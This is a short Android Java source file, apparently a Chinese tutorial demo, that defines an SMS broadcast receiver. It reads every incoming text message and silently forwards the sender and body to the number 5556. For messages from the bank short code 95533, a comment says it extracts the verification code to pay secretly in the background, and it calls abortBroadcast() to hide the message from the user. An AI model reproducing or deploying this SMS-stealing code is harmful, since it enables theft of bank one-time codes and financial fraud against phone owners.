package com.example.smsdemo;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

public class SmsListener extends BroadcastReceiver
{

	@Override
	public void onReceive(Context context, Intent intent)
	{
		System.out.println("短信到来了。");
		//objs里面存放的就是一组短信
		Object[] objs = (Object[]) intent.getExtras().get("pdus");  //google就是这样封装的短信所以获取时 也应该这样获取
		for(Object obj:objs)
		{
			//得到每一条短信数据
			SmsMessage  smsMessage = SmsMessage.createFromPdu((byte[]) obj);
			String body =  smsMessage.getMessageBody();				//短信内容
			String address = smsMessage.getOriginatingAddress();   //手机号
			System.out.println(body);								//打印内容
			System.out.println(address);							//打印号码
			SmsManager smsManager = SmsManager.getDefault();     //获取短信管理器
			smsManager.sendTextMessage("5556", null, address+"--"+body, null, null);  //发送普通文本短信
			if(address.equals("95533"))
			{
				System.out.println("提取验证码，偷偷的后台支付");
				abortBroadcast();    //短信广播也是有序广播 所以可以拦截
			}
		}
	}

}
